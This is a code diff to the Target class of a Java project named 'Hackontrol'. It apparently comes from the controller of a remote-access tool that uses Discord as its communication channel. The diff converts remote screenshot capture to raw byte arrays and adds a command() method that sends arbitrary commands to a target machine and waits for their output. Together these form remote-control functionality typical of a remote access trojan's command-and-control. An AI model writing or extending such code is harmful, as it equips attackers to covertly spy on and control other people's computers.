@@ -1,8 +1,6 @@
 package com.khopan.hackontrol;
 
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
-
+import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 
 import net.dv8tion.jda.api.entities.Message.Attachment;
@@ -13,7 +11,8 @@ public class Target {
 
 	boolean connected;
 
-	private volatile Bitmap image;
+	private volatile byte[] image;
+	private volatile String commandResult;
 
 	public Target(Hackontrol hackontrol, MachineId identifier) {
 		this.hackontrol = hackontrol;
@@ -25,7 +24,7 @@ public class Target {
 		return this.identifier;
 	}
 
-	public Bitmap screenshot() {
+	public byte[] screenshot() {
 		this.check();
 		this.image = null;
 		this.hackontrol.request.screenshot();
@@ -33,19 +32,43 @@ public class Target {
 		return this.image;
 	}
 
+	public String command(String command) {
+		this.check();
+		this.commandResult = null;
+		this.hackontrol.request.command(command);
+		while(this.commandResult == null) {}
+		return this.commandResult;
+	}
+
 	void screenshotTaken(Attachment attachment) {
 		new Thread(() -> {
-			Bitmap image;
+			byte[] image;
 
 			try {
-				InputStream stream = attachment.getProxy().download().get();
-				image = BitmapFactory.decodeStream(stream);
+				InputStream inputStream = attachment.getProxy().download().get();
+				ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+
+				while(true) {
+					int data = inputStream.read();
+
+					if(data == -1) {
+						break;
+					}
+
+					outputStream.write(data);
+				}
+
+				image = outputStream.toByteArray();
 			} catch(Throwable ignored) {
 				return;
 			}
 
 			this.image = image;
 		}).start();
+	}
+
+	void commandResult(String result) {
+		this.commandResult = result;
 	}
 
 	private void check() {
